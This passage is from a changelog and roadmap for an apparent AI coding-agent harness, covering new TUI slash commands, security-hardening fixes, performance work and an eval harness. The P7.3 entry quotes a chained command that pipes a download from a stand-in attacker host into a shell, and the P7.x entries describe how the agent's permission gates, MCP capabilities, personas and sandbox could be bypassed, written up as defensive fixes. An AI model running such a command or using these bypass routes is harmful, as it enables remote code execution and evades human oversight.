dispatchable and listed in `/help`, yet never appeared in the `/`-autocomplete popup or palette.
That was precisely why `/security-config` "didn't exist" from the user's point of view: typing
`/sec` surfaced nothing.

**P14.1 — SHIPPED 2026-07-05** — the seven missing entries were added to `builtinCommands` (and the
arg-taking ones — `security-config`/`scan`/`debate`/`rollback`/`detach`/`archive`/`humor` — to
`commandsNeedingArgs`), plus a guard test (`TestBuiltinCommandsCoverDispatchTable`,
`internal/tui/completion_test.go`) asserting `builtinCommands` covers every `d.builtins` key except
the `quit` alias, mirroring `TestSlashCommandsAreListedInHelp`. There is still no dedicated
`/security` umbrella command (only `/security-config`) — that's P14.2, not part of this fix.

**P14.10 — SHIPPED 2026-07-05** — the structural cure, built immediately after P14.1 rather than
left as a follow-up: `internal/tui/commands.go` (new) defines each built-in command exactly once as
a `commandDef` struct (name, arg hint, short description, detailed help, whether it needs args, and
its handler as a method expression `(*SlashDispatcher).cmdX`). `d.builtins` (dispatch), `cmdHelp`'s
general listing, `builtinHelp` (detailed `/help <name>`), and `completion.go`'s `builtinCommands`/
`commandsNeedingArgs` are now all derived from this one table — a fourth list can no longer drift
out of sync with the other three, closing the entire class of bug P14.1 fixed one instance of.
`commandDefs` is a function rather than a package-level `var`: a `var` initializer that references
handler values whose bodies range over that same `var` is a compile-time initialization cycle in
Go, so the table is rebuilt on each lookup instead (cheap — ~26 entries, called only on dispatcher
construction, `/help`, and popup population). New test `TestCommandDefsWellFormed` guards the table
itself (no empty/duplicate names, every entry has a handler and help text). All P14.2–P14.9
`/`-surface additions below should register into this table rather than reintroducing hand-written
lists.

### P14.2 — SHIPPED 2026-07-05 — In-session security surface (`/security`)

`/security-config` was the only security command in the TUI; `aegis security status` (carrying the
P13.1 cross-platform availability info), `aegis security install <tool>`, and `aegis security
baseline` were CLI-only. Added `/security [status|install <tool> [confirm]|baseline [path]|config
[global]]` (`internal/tui/slash.go`'s `cmdSecurity` and its four sub-handlers) so the whole
security-tooling surface is reachable in-session — registered as a single new entry in the P14.10
`commandDefs` table, which is the payoff of building P14.10 first: dispatch, `/help`, and the
completion popup all picked it up automatically with no separate edits.

- `status`/bare args and `baseline [path]` are read-only local computations (same pattern as the
  existing `/sandbox` and `/security-config`: read the TUI process's own config/workspace directly,
  no daemon round trip) mirroring the CLI's tabwriter-formatted output exactly.
- `config [global]` delegates to the existing `cmdSecurityConfig` handler rather than duplicating
  its dialog-opening logic.
- `install <tool> [confirm]` adapts the CLI's interactive y/N approval gate to the slash-command
  shape, where a command returns one `SlashResult` with no stdin prompt: the first invocation only
  previews the tool summary and exact host command; a second invocation with a literal trailing
  `confirm` argument actually runs `security.RunGuidedInstall`. Never installs without that explicit
  word, preserving the "never install silently" posture from P11.10 without adding new dialog/
  confirmation-view plumbing.
- Tests: `internal/tui/security_test.go` (8 cases — status, baseline empty/populated, config
  delegation to both scopes, install unknown-tool error, install requires explicit confirm, unknown
  subcommand error).

### P14.3 — SHIPPED 2026-07-05 — Knowledge base & repo index in-session (`/knowledge`, `/index`)

`aegis knowledge index` (P3.3/P5.8 project knowledge base) and `aegis index` (P2.3 repo map) were
CLI-only; the model has tools for them but the user couldn't drive indexing/query from the TUI. Added
`/knowledge [index|query <text>]` and `/index`, both routed through the daemon (new `POST /knowledge`
and `POST /repomap/index` endpoints) rather than opening a second local store, since `/index` also
needs to refresh the daemon's own cached system-prompt block. See the full writeup below (folded
into Appendix A's P14.3 entry).

### P14.4 — SHIPPED 2026-07-06 — Session / run / background lifecycle surface

Only the Ctrl+R picker and `/archive [off]` touched session lifecycle from the TUI; `aegis
sessions`, `aegis bg list|events`, `aegis runs`, session pruning, and archived-session listing were
CLI-only. `/session [list]` (singular) already existed from an earlier pass and covers the
`/sessions [list]` half of this item, so no duplicate command was added for that. Added `/archive
list` (lists archived sessions via the existing `ListArchivedSessions` client call, filtered to
`Archived: true` since that endpoint returns all sessions when queried with `archived=true`),
`/prune [days]`, `/runs`, and `/bg [list|events [session-id]]` — all new entries in the P14.10
`commandDefs` table (`internal/tui/commands.go`), handlers in `internal/tui/slash.go`
(`cmdPrune`, `cmdRuns`, `cmdBG`; `cmdArchive` gained the `list` branch). `/bg events` defaults to
the current session if no id is given, unlike the CLI's `aegis bg events <id>` which requires one.
All four reuse the client methods the roadmap already flagged as available
(`ListArchivedSessions`/`PruneSessions`/`ListRuns`/`GetBGEvents`) — no new daemon endpoints needed.
Tests: `internal/tui/lifecycle_test.go` covers the argument-validation fast paths that return
before touching the client (`/prune not-a-number`, unknown `/bg` subcommand), matching this
codebase's established convention of not spinning up an `httptest` server inside `internal/tui`
tests (noted in the P14.5 writeup) — the daemon-side round trip for these endpoints is already
covered by existing `internal/server` tests. Docs: `docs/tui-guide.md`'s Navigation & Sessions
table.

### P14.5 — SHIPPED 2026-07-05 — `/status` daemon/session health

`warnSandboxFallback` printed the sandbox-fallback warning once to stderr *before* the TUI started,
then it was gone for the rest of the session. Added `/status` (`internal/tui/slash.go`'s
`cmdStatus`, registered in the P14.10 `commandDefs` table) showing daemon reachability,
provider/model, the active sandbox backend and any fallback reason, this session's cumulative
spend against its caps, and cross-session *today's* spend against the P9.5/P10.5 daily caps.

The daily-spend half needed real daemon plumbing, not just a UI: `client.Status()`/`/healthz` never
carried it (by design — `/healthz` is polled every ~100ms by `waitForDaemon` during startup, so it
stays minimal), and the actual daily totals only lived in `session.Store.TodayCost`/`TodayTokens`,
already written by `recordDailySpend` for the P9.5/P10.5 caps but never read back out anywhere. Added
a new `GET /status` endpoint (`api.StatusInfo`, `Server.handleStatusInfo`, `Client.StatusInfo`)
distinct from `/healthz` so the frequently-polled path doesn't pay for two extra DB reads per call.
Sandbox backend *name* (as opposed to the fallback bool/reason, which is daemon-authoritative) is
read from the local config, matching the existing no-daemon-round-trip convention `/sandbox` and
`/security` already use. Tests: `TestServerStatusEndpoint` (`internal/server/server_test.go`) for
the new endpoint; the TUI-side command has no dedicated round-trip test, matching this codebase's
existing convention of not spinning up an `httptest` server inside `internal/tui` tests — covered by
the endpoint test plus a manual `/status` run against a live daemon. P13.4.4's engagement/activity
digest (not started) can extend this command's output rather than adding a separate one.

### P14.6 — SHIPPED 2026-07-06 — `/bundle [install|info <path-or-url>]`

`aegis bundle install/info <git-url>` (P5.7, with P7.6 content-hash pinning) was CLI-only; installing
a persona/skill bundle mid-session forced a trip out to the shell. Added `/bundle info <path-or-url>`
and `/bundle install <path-or-url> [global] [sha256:<hash>] [confirm]`
(`internal/tui/slash.go`'s `cmdBundle`/`cmdBundleInfo`/`cmdBundleInstall`, registered in the P14.10
`commandDefs` table), calling `internal/bundle` directly (no daemon round trip needed — bundle
install/info are pure local-filesystem operations, same as `/sandbox` and `/security`) rather than
shelling out to the CLI binary.

- Since slash commands don't have flag syntax, the CLI's `--scope`/`--expect-sha256` flags become
  trailing keyword tokens in any order: `global` selects the user data dir instead of the default
  project `.aegis/` scope (matching the `global` keyword `/skills` and `/security-config` already
  use for the same distinction), and a bare or `sha256:`-prefixed hash pins the P7.6 content-hash
  provenance check.
- Reused the exact confirm-gating shape `/security install` established: the first invocation only
  previews the manifest, artifact list, target scope directory, and content hash; nothing is
  written until a second invocation adds a literal trailing `confirm`. A hash mismatch aborts
  before installing even with `confirm` present, same as the CLI's `--expect-sha256`.
- `bundleIsGitURL`/`bundleResolveSource`/`bundleScopeDir` are unexported copies of
  `internal/cli/bundle.go`'s equivalents (git-URL detection/shallow-clone-to-temp-dir/scope
  resolution) — kept separate rather than shared, matching the existing `securityMethodLabel`
  precedent that `internal/cli` isn't (and shouldn't become) an import of `internal/tui`.
- Tests: `internal/tui/bundle_test.go` (8 cases) — bare-args/unknown-subcommand/missing-path usage
  errors before touching the filesystem, content-hash display, preview-writes-nothing without
  `confirm`, `confirm` actually installs, P7.6 hash-mismatch abort, and `global` scope targeting the
  user data dir instead of the project's `.aegis/`.

### P14.7 — SHIPPED 2026-07-06 — `/model <id>` direct mid-session model switch

`/models` showed model info but couldn't switch; changing model mid-session required a
model-pinning persona or a restart. This needed real plumbing, not just a UI wrapper: no per-session
model override existed anywhere — a session only ever resolved its model through
`personaModel` (config override → persona's own `Model` → global `provider.model`), fixed for the
session's lifetime via whichever persona it carried.

- Added a `model` column to the `sessions` table (`internal/session/session.go`, same idempotent
  `ALTER TABLE ADD COLUMN` migration pattern as `persona`/`background`), a `Model` field on both
  `Session` and `Meta`, and `Store.SetModel` mirroring `SetPersona`. Empty string means "no
  override" — falls through to the persona/global default.
- `api.SessionMeta` and `api.UpdateSessionRequest` gained a `Model`/`Model *string` field; `PATCH
  /sessions/{id}` (`handleUpdateSession`) persists it via `SetModel` the same way it already does
  for `Mode`/`Persona`.
- New `Server.resolveModel(p persona.Persona, sessionModel string) string` layers the session
  override on top of the existing `personaModel(p)`: non-empty `sessionModel` wins outright,
  otherwise falls through unchanged — same precedence relationship a config-level persona override
  already has over a persona file's own `Model`. `newEngine` gained a `modelOverride string`
  parameter (its one call site, `handlePostMessage`, passes `sess.Model`) and now calls
  `s.resolveModel(p, modelOverride)` instead of `s.personaModel(p)` directly, so both the guard
  model and the turn's actual model pick up the override.
- TUI: `/model <model-id>` (`internal/tui/slash.go`'s `cmdModel`, registered in the P14.10
  `commandDefs` table) calls the existing `client.UpdateSession` (no new client method needed, same
  as `/mode`/`/persona`); `/model default` clears the override by sending an empty string. No args
  shows the current model.
- **Not enforced, by design, matching the persona-level precedent**: neither this nor a persona's
  own `Model` field is validated against the configured provider's actual model list — there is no
  such list anywhere in the codebase today. "Constrained to same-provider" is an architectural
  fact (the daemon has exactly one `provider.Adapter` bound to one provider), not a runtime check;
  requesting a model belonging to a different provider than the configured adapter surfaces as a
  provider error on the next turn, not at switch time. The command's help text says this
  explicitly rather than implying validation that doesn't exist.
- **Known cosmetic gap, not fixed here**: the TUI's model display used for the context-window-size
  calculation and status/welcome text (`m.cfg.Model` in `internal/tui/tui.go`) is set once at
  startup and isn't updated by `/model` (mirroring `/mode`'s existing, pre-P14.7 gap — `m.cfg.Mode`
  is likewise only refreshed on a session switch, not on `/mode` itself). The session-level override
  this item is about is real and does change what model the next turn actually uses; only the
  sidebar/context-bar cosmetic display can lag behind it.
- Tests: `internal/server/server_guard_test.go`'s `TestResolveModelSessionOverrideWins` (session
  override beats a config-pinned persona; empty falls through to `personaModel`),
  `internal/server/server_test.go`'s `TestPatchSessionModel` (PATCH → GET round trip, patch-response
  echo, clearing back to empty — real daemon, real SQLite store), and
  `internal/tui/model_test.go`'s bare-args fast path. Verified manually end-to-end against a live
  daemon with a scratch session: switch, re-read, clear, re-read, then deleted the scratch session.

### P14.8 — SHIPPED 2026-07-06 — `/theme <dark|light>` runtime theme switch

`tui.theme` was config-only and needed a restart, even though `applyTheme`/`applyScheme` (TQ10)
already supported rebinding the color scheme at runtime. The missing piece wasn't the scheme swap
itself — it was that nothing rebuilt the things built *from* the scheme at startup: `m.th` (a
`theme` of `lipgloss.Style` values that capture colors at construction, per `theme.go`'s own
comment) and the glamour markdown renderer (`newGlamourRenderer`, keyed off the package-level
`glamourStyleName`, previously only ever recreated on a width change).

- `internal/tui/commands.go`: new `theme` entry (`argHint: "<dark|light>"`, `needsArgs: true`),
  registered into the P14.10 `commandDefs` table like every other P14 item.
- `internal/tui/slash.go`'s `cmdTheme`: no args shows the current theme; an unknown name is rejected
  as an error at the dispatcher level (same validate-your-own-args precedent as `/mode`/`/sandbox`)
  rather than silently falling back like a config-file typo would. `SlashDispatcher` has no
  reference to `model` (theme is package-global TUI state, not per-session), so a valid switch
  can't apply itself — it emits a `"\x00theme <name>"` sentinel `Output`, the same
  local-UI-state-change convention already used by `/humor`, `/sidebar`, and `/copy`.
- `internal/tui/tui.go`'s `slashResultMsg` case gained the two sentinel branches: `"\x00theme-show"`
  prints `m.cfg.Theme`, and `"\x00theme <name>"` calls `applyTheme(name)`, then explicitly rebuilds
  `m.th = newTheme()` and `m.renderer = newGlamourRenderer(m.rendererW)` before `m.refresh()` — the
  step this item actually needed, since `colorScheme`'s runtime-safety alone doesn't repaint
  anything already built. `applyTheme` and `Run` gained a `normalizeThemeName` helper so
  `m.cfg.Theme` is always canonically `"dark"` or `"light"`, never blank or an unrecognized string,
  for display purposes.
- Same known limitation as `/humor`'s toggle: already-rendered transcript content (past glamour
  output) keeps its old colors; only content rendered after the switch picks up the new scheme.
  This session only — set `tui.theme: <name>` in config to make it the default on restart.
- Tests: `internal/tui/theme_test.go` (bare-args sentinel, unknown-name rejection, valid-name
  sentinel, and a `driveUpdate`-based test proving the live switch actually flips
  `glamourStyleName`/`m.cfg.Theme`/the rendered transcript through the real `Update` path — the
  first model-level test for this whole sentinel-message convention family).

### P14.9 — SHIPPED 2026-07-06 — Keybinding discoverability

Several features are keybind-only with no slash-command equivalent — Ctrl+X terminal pane, Ctrl+T
sub-agent list, Ctrl+R session switcher, Ctrl+O thinking expand/collapse — so a user who only reads
`/help` would never find them. An F1 overlay (`renderHelpOverlay`, `internal/tui/tui.go`) already
listed every keybinding, but F1 itself is a keybind you have to already know about.

- `internal/tui/keymap.go`: extracted `keyMap.helpEntries()` (returns `[]keyHelpEntry{Key, Desc}`)
  from what was an inline slice literal duplicated as-needed — now the single source both consumers
  share, the same drift class P14.10 fixed for slash commands.
- `internal/tui/tui.go`'s `renderHelpOverlay` (the F1 overlay) now calls `m.keys.helpEntries()`
  instead of building its own copy of the list.
- `internal/tui/slash.go`'s `cmdHelp` (no-args general listing) appends a "Keyboard shortcuts (also
  shown via f1)" section built from `defaultKeyMap().helpEntries()` — reachable by typing `/help`,
  no F1 discovery step required.
- Tests: `internal/tui/help_test.go`'s `TestHelpListsKeyboardShortcuts` asserts every keymap entry's
  key string appears in `/help`'s output.

---

## Appendix A — Completed Work

<details>
<summary><strong>P2 — all 9 items shipped 2026-07-01</strong></summary>

- P2.1 Ripgrep + `ls` directory tree tool
- P2.2 Bang `!` shell mode in TUI
- P2.3 Frecency-ranked @mention file autocomplete
- P2.4 File-change tracking in sidebar
- P2.5 Subagent footer strip
- P2.6 Max-step graceful degradation
- P2.7 Proactive context compaction (85% headroom check)
- P2.8 Conversation timeline dialog (`/timeline`)
- P2.9 Workflow agent primitives (sequential / parallel / loop)

</details>

<details>
<summary><strong>P3 — all 6 items shipped 2026-07-02</strong></summary>

- P3.1 Tiered long-term memory — SQLite FTS5 entity store (`internal/longmem`); `entity_remember` / `entity_recall` tools; ADK `BaseMemoryService`-compatible interface
- P3.2 Async/background task execution — `/detach` TUI command; daemon persists session to `bg_events` table; `aegis bg list/events` CLI; detached context survives TUI disconnect
- P3.3 DeepWiki-style project knowledge base — SQLite FTS5 index of docs/comments (`internal/knowledge`); `project_knowledge` tool with BM25 ranking and snippet extraction
- P3.4 Automatic rollback on tool failure — `git_sha` captured per checkpoint; `/rollback` TUI command runs `git reset --hard <sha>`; `GitRollback` flag on `RewindRequest`
- P3.6 Typed tool output schemas — optional `OutputSchemer` interface on `Tool`; `OutputSchema json.RawMessage` on `ToolSchema`; all built-in tools declare output schemas
- P3.7 Animation pause off-screen — spinner tick suppressed when `followBottom` is false; animation resumes automatically on scroll-back

</details>

<details>
<summary><strong>P4 — Core Harness Parity, all 6 items shipped 2026-07-02</strong></summary>

- P4.3 Skills progressive disclosure — `internal/skills` now injects a compact `<skills_available>` index (name + frontmatter `description:`); a `skill` builtin tool loads the full body on demand. Description-less skills fall back to eager injection.
- P4.3 extension (2026-07-04) — five skills embedded in the binary (content-review, html-report ported from `.aegis/skills`; security-audit, architecture-diagram, debug-investigation newly written) via `go:embed` in `internal/skills/builtin`, materialized to `<data_dir>/builtin-skills/` at daemon startup. Dormant by default (zero system-prompt cost); enabled per-name via `skills.builtin_enabled` config (project overrides global overrides built-in on a name collision), `aegis skills enable|disable|list` CLI, or `/skills enable|disable <name> [global]` TUI. Also fixed: `internal/memory`'s `loadSkills()` was eagerly re-injecting full (unstripped-frontmatter) skill bodies into the system prompt in parallel with `skills.BuildIndex`, which both duplicated bundled-skill content and silently bypassed progressive disclosure for any flat `.md` skill file with a `description:` — removed, `internal/skills` is now the single injection path.
- P4.4 User-configurable lifecycle hooks — `hooks:` config maps `pre_tool_use`/`post_tool_use`/`session_start`/`stop`/`subagent_stop` to shell commands (`internal/hooks` `Exec`); JSON event on stdin, exit 2 vetoes with stderr surfaced.
- P4.5 Headless structured output — `aegis chat --output-format text|json|stream-json`.
- P4.6 Deferred tool loading — `tool.Registry` gained `RegisterDeferred`/`Deferred`/`Load`/`SearchDeferred`; niche tools (latex, diagram, cron, lsp, longmem, team) are advertised as a `<deferred_tools>` one-liner and loaded via the `tool_search` meta-tool.
- P4.7 OS-level sandbox — `sandbox.backend: os` confines the local shell via macOS seatbelt / Linux bwrap; reported by `aegis sandbox detect`.
- P4.8 Close the loop — `git_pr` tool pushes the branch and opens a PR via `gh`, with a GitHub compare-URL fallback.

</details>

<details>
<summary><strong>P5 — all 9 items shipped 2026-07-02</strong></summary>

- P5.1 Agent teams — SQLite-backed shared task list (`swarm.TaskList`, `team_task_*` tools with atomic claim) + peer messaging (`team_send`/`team_inbox` over the file mailbox).
- P5.2 LSP tools — added `definition`, `hover`, `document_symbols`, `workspace_symbols`, `call_hierarchy` (registered deferred).
- P5.3 Pluggable web search — `search:` config selects brave/tavily/searxng; DuckDuckGo scrape remains the zero-config fallback.
- P5.4 Background notifications — `notify:` config fires desktop (osascript/notify-send/toast) and/or webhook on background-session completion/error.
- P5.5 @file#L10-40 line-range mentions — server expands `@path#L10-40` tokens in user messages to inline file excerpts before the engine call.
- P5.6 Draft stash — unsent textarea content saved to `.aegis/stash.json` on quit; restored on next session start.
- P5.7 Bundle install from git URL — `aegis bundle install/info <git-url>` clones `--depth=1` to temp dir and installs as a normal local bundle.
- P5.8 Semantic recall layer — `internal/embed` (Ollama `/api/embed` client, cosine similarity, reciprocal-rank fusion); `knowledge.Store` and `longmem.Store` gained an optional `Embedder` and a `docs_vec`/`mem_vec` BLOB vector table; `Search`/`SearchMemory` fuse BM25 + semantic rankings via RRF when `embeddings.enabled: true`, else BM25-only (default). `aegis knowledge index` CLI command added. Along the way, fixed a real gap: `knowledge.Store`/`longmem.Store` were built but never opened by the daemon — `project_knowledge`/`entity_remember`/`entity_recall` were dead tools; now wired into `internal/server`.
- P5.9 Provider failover — `provider.WithFailover` chains a primary adapter with ordered fallback targets, switching only on synchronous Stream failure after each target's own retry budget is exhausted (never mid-stream, so no partial output is replayed). `provider.fallback` config (ordered provider/model/base_url entries) + `provider.allow_cloud_fallback` guard: local→cloud failover is skipped with a warning unless explicitly opted in; cloud→cloud and any→local are never gated. `providerfactory.Build` assembles the chain.

</details>

<details>
<summary><strong>P7.1 — MCP capability laundering fixed, shipped 2026-07-03</strong></summary>

- `mcp.ServerConfig` gained `capability` (per-server default) and `tool_capabilities` (per remote tool name override) config fields; `internal/config.MCPServerConfig` and `internal/server` wiring pass them through.
- `internal/mcp/tool.go`: `mcpTool`/`mcpResourceListTool`/`mcpResourceReadTool`/`mcpPromptListTool`/`mcpPromptGetTool` all carry a resolved `tool.Capability` field instead of hardcoding `tool.CapNetwork`; `resolveCapability`/`parseCapability` default anything unlabeled/unrecognized to `tool.CapExecute` (most restrictive), matching the existing `internal/plugins` process-tool pattern.
- Net effect: an unlabeled or untrusted MCP server's tools now hit the `Ask` gate in build mode and are denied outright in plan mode, instead of the always-allowed `network` capability. Trusted servers opt back into `network` (or any other class) explicitly per-server or per-tool.
- Tests: `internal/mcp/mcp_test.go` — `TestParseCapabilityDefaultsToExecute`, `TestResolveCapabilityPerToolOverride`, `TestResolveCapabilityDefaultsExecuteWithNoConfig`.
- Docs updated: `docs/configuration.md` (MCP server example with `capability`/`tool_capabilities`), `docs/security.md` (`egress_then_write` network-capability description).

</details>

<details>
<summary><strong>P7.2–P7.7 — remaining security-hardening audit items, shipped 2026-07-03</strong></summary>

- **P7.2 (shell env leak):** `internal/sandbox/env.go` (new) strips `ANTHROPIC_API_KEY`/`OPENAI_API_KEY` (`DefaultStripEnv`) from `cmd.Env` in both `LocalBackend` and `OSBackend` (`local.go`, `os_sandbox.go`); `sandbox.strip_env` config (`config.SandboxConfig.StripEnv`) adds more names (e.g. MCP tokens from `.aegis/.env`) via `NewLocalBackendWithEnv`/`NewOSBackend`'s new param. Container backend untouched — `docker run`/`podman run` never passed host env into the container to begin with.
- **P7.3 (exec allow-rule chaining bypass):** `internal/permission/rules.go` adds `globToRegexpExec` — for an `allow` rule scoping an execute-capability tool, `*`/`?` cannot span shell chaining/substitution chars (`;&|`+"`"+`$()<>`+ newline), so`allow bash(npm test*)`no longer matches`npm test && curl evil.com|sh`. Deny rules deliberately keep the original broad `.*` (over-matching on deny is safe).
- **P7.4 (silent sandbox fallback):** sandbox backend selection extracted to standalone `server.selectSandbox` (testable in isolation); `sandbox.strict` config makes a failed `container`/`os` backend init a hard startup error instead of silently falling back to local. Non-strict fallback is recorded on `Server` and surfaced via `/healthz` (`api.HealthStatus.SandboxFallback`); `client.Status()` + `cli.warnSandboxFallback` print a warning banner in the TUI/`aegis ui` before entering a session.
- **P7.5 (persona mode escalation):** `persona.Persona` gained a `Loaded bool` field (true only for `*.md`-parsed personas, never built-ins); `server.resolveSessionMode` ignores a loaded persona's `mode: auto` when it's more permissive than the configured default and the caller didn't explicitly request a mode, logging a warning instead. Built-in personas remain fully trusted.
- **P7.6 (no bundle provenance check):** `bundle.Bundle.ContentHash()` computes a deterministic `sha256:`-prefixed digest over the manifest + every artifact file; `aegis bundle info` prints it, `aegis bundle install --expect-sha256 <hash>` aborts before writing anything on mismatch. Trust-on-first-use pinning, not a signature.
- **P7.7 (silent no-op deny rules):** `permission.WarnUnmatchableRules` (called once at startup against `tool.Registry.All()`, a new method) flags any non-`*`-pattern rule targeting a tool whose input schema has none of `subjectFor`'s recognized fields (`command`/`path`/`file_path`/`url`/`query`/`pattern`) — such a rule can never match, so it's logged instead of silently no-op'ing.
- Docs: `docs/configuration.md`, `docs/security.md`, `docs/permissions.md`, `docs/personas.md`, `docs/extensibility.md` all updated with the new config knobs/flags and their security rationale.

</details>

<details>
<summary><strong>P8 — Performance audit findings, all 6 items shipped 2026-07-03</strong></summary>

- **P8.1 (session store O(N²) rewrite):** `internal/session/session.go` gained `session_messages`/`session_traces` row-per-message/row-per-trace tables. `AppendMessages` (new) and `AppendTraces` (rewritten) now pure-`INSERT` new rows keyed by an incrementing `seq`, no more read-modify-write of the whole blob; `SaveMessages` keeps full-replace semantics (delete + reinsert) for the rewind/truncation case where earlier history itself changes. A one-time `migrateLegacyBlobs` backfills any pre-P8.1 whole-blob `messages`/`traces` columns into the row tables on first `Open()` after upgrade, then zeroes the legacy columns so it's a no-op on every later startup. `engine.Conversation` gained a `Persisted int` field (count of already-durable leading messages; `-1` means "rewritten in place, must fully re-save") that `repairOrphanedToolUses`/compaction reset via a new `invalidate()` helper; `server.go`'s per-turn save now calls `AppendMessages(conv.Messages[conv.Persisted:])` on the common path and only falls back to full `SaveMessages` when history was actually rewritten this turn. `Delete`/`Prune` clean up the new row tables too.
- **P8.2 (knowledge search full-corpus load):** `internal/knowledge/knowledge.go`'s `semanticRanking` now queries `docs_vec` (path+vector only) for the scoring pass, then a new `fetchSnippets` runs a second `WHERE path IN (...)` query for just the top-K survivors' title/body — no more pulling every document's full body into memory to rank.
- **P8.3 (swarm mailbox unbounded growth):** `internal/swarm/mailbox.go`'s `MarkRead` now moves the message file into a `processed/` subdirectory (instead of rewriting its `read` flag in place); `ReadAll(unreadOnly=true)` — the hot poll path used by the `team_inbox` tool — only lists the inbox directory, which now shrinks as messages are consumed instead of growing forever. `ReadAll(false)` still merges in `processed/` for full-history callers.
- **P8.4 (token estimation double-scan):** `engine.Conversation` gained a cached `estimatedChars()`/`charCountValid` pair; `Append` updates the cache incrementally, and anything that rewrites history calls the same `invalidate()` used by P8.1 to force a full recompute on next access. The two `estimateTokens` call sites (proactive-compaction check, zero-usage fallback) now share one scan per turn instead of two, and normal turns pay zero extra scan cost.
- **P8.5 (memory relevance TF-IDF recompute):** `internal/memory/relevance.go` gained `cachedEntries()` / `relevanceSnapshot`, keyed on a cheap `entriesSignature()` fingerprint (mtime+size per memory/skill file, no content read) stored on the existing `sourcesCache` (from `NewSources`); `allEntries()`/document-frequency build only reruns when a source file actually changed. `LoadRelevant` copies the cached entries before scoring so concurrent/sequential queries never mutate the shared cache.
- **P8.6 (execLock over-serializes reads):** `internal/engine/engine.go`'s `runTools` swapped `execLock sync.RWMutex` for a plain `sync.Mutex` taken only by write/execute tool calls; read/network calls no longer take any lock and run fully concurrently with a same-round write/execute call instead of blocking behind it.
- Tests: `internal/session/session_test.go` (`TestAppendMessagesIsIncremental`, `TestAppendMessagesMissingSession`, `TestSaveMessagesTruncates`, `TestDeleteRemovesMessageAndTraceRows`, `TestLegacyBlobMigration`), `internal/swarm/mailbox_test.go` (`TestMarkReadEvictsFromInbox`), `internal/memory/relevance_test.go` (`TestLoadRelevantCacheInvalidatesOnFileChange`).

</details>

<details>
<summary><strong>P9.1/P9.2/P9.5 — Eval harness, test coverage, spend caps, shipped 2026-07-03</strong></summary>

- **P9.1 (eval/regression harness):** new `internal/eval` package. A `Scenario` (system prompt + fully-built `engine.Options` + a sequence of user turns) runs against a real `engine.Engine` wired with a scripted/deterministic `provider.Adapter` — no live model, so it's part of `go test ./...` with no API key required. `Check` functions (`ExpectToolCalled`, `ExpectToolNotCalled`, `ExpectNoError`, `ExpectErrorContains`, `ExpectFinalTextContains`) assert on the `Result`; `AssertGolden` pins a deterministic JSON transcript per scenario under `internal/eval/testdata/`, regenerated via `AEGIS_EVAL_UPDATE=1 go test ./internal/eval/...`. Four scenarios ship as the initial suite (`internal/eval/scenarios_test.go`): a tool-call round trip (golden-pinned), plan-mode denying a write tool before `Execute` ever runs, a cost-budget abort stopping before its second turn, and multi-turn conversation continuity across two user turns. This exercises the interaction between engine, permission gate, and tool registry the way a real session would — regressions that only show up when those mechanisms combine won't necessarily trip a narrower per-mechanism unit test.
- **P9.2 (test coverage for trace/logging/api/client):** `internal/trace`, `internal/logging`, `internal/api`, `internal/client` all gained `_test.go` files (previously zero coverage). `internal/api`'s tests lock the on-the-wire `EventKind` strings and round-trip every wire type, since a silent rename there breaks the TUI/CLI without a compile error. Writing `internal/logging`'s tests surfaced a real bug: `ToStderr: true` with a `Path` set was replacing file output with stderr-only instead of mirroring both (contradicting the field's own doc comment) — fixed with `io.MultiWriter`, which is what `aegis serve --foreground` needs to keep a durable log file while also printing to the terminal.
- **P9.5 (spend caps):** `internal/config.CostConfig` gained `session_cap_usd` and `daily_cap_usd` (0 = unlimited, same convention as the existing `budget_usd`) plus `alert_threshold` (fraction, default 0.8). `internal/session.Store` gained a `daily_cost` table (`AddDailyCost`/`TodayCost`, keyed by UTC date) since the existing per-session `cost_usd` column can't answer "how much across all sessions today." `server.handlePostMessage` checks both caps before starting a turn (rejecting with 402 rather than the existing mid-run `budget_usd` abort, which is per-turn only) and emits a new `api.KindCostAlert` SSE event the turn that crosses `alert_threshold` of either cap (rendered in the TUI like the existing guard warning). This is additive to the pre-existing `budget_usd` single-run abort, not a replacement.
- Tests: `internal/eval/scenarios_test.go` (4 scenarios + golden transcript), `internal/api/api_test.go`, `internal/trace/trace_test.go`, `internal/logging/logging_test.go`, `internal/client/client_test.go`, `internal/session/session_test.go` (`TestTodayCostDefaultsToZero`, `TestAddDailyCostAccumulates`), `internal/server/server_test.go` (`TestSessionCostCapBlocksTurn`, `TestDailyCostCapBlocksTurn`, `TestCostAlertThresholdFires`).

</details>

<details>
<summary><strong>Persona QoL pass — advisory tool gate, CLI, default persona, shipped 2026-07-03</strong></summary>

Not a numbered roadmap item — a follow-through pass closing gaps left by the P7.5 persona-trust model and earlier persona hot-reload/full-profile-switch work.

- **`permission.PersonaToolGate`** (`internal/permission/persona_tools.go`, new): wraps the base gate with an advisory check against a persona's declared `Tools` list. Deliberately not a security boundary (same trust model as P7.5) — a tool call outside the list is logged and routed through the session's `Approver`: a non-interactive approver (e.g. auto mode) warns and allows, the TUI's interactive approver prompts and reuses its session-scoped allow-always cache. Declining blocks that call; approving (or an empty `Tools` list) always falls through to the real base gate.
- **`aegis persona` CLI** (`internal/cli/persona.go`, new): `list` (built-in/custom/default markers), `show <name>` (source, model, mode, tools, rules, guard, prompt; `--full` for the entire prompt), `new <name>` (scaffolds a commented frontmatter template, `--global` for the user directory), `use <name>` (writes `default_persona` to project or `--global` user config).
- **`default_persona` config** (`internal/config`): a new session with no explicit `--persona` resolves project `default_persona` → user-global `default_persona` → `general`. `config.PatchProjectDefaultPersona`/`PatchGlobalDefaultPersona` back the CLI's `use` subcommand.
- **Full-profile mid-session persona switch**: `api.UpdateSessionRequest` gained `Persona`; `/persona` in the TUI now switches the persisted persona name (so model/rules/guard re-resolve every turn, not just the system prompt) and applies the persona's default permission mode when the user hasn't set one explicitly, reporting the mode change.
- **Output guard rubric refinement**: `DefaultGuardRubric` and the `--first-init` template now explicitly excuse clearly-marked example/placeholder values in documentation (illustrative IPs, `<your-api-key>`-style tokens) from the "no placeholders" check, since those are legitimate and the real value was never supplied to the model.
- Tests: `internal/permission/persona_tools_test.go`, `internal/cli/persona_test.go`, `internal/config/write_persona_test.go`, plus updates to `internal/persona/load_test.go`, `internal/persona/persona_test.go`, `internal/server/server_test.go`.
- Docs: `README.md`, `CLAUDE.md`, `docs/cli-reference.md`, `docs/configuration.md`, `docs/personas.md` all updated in the same commit.

</details>

<details>
<summary><strong>P6.4 — Context editing / tool-result pruning, shipped 2026-07-03</strong></summary>

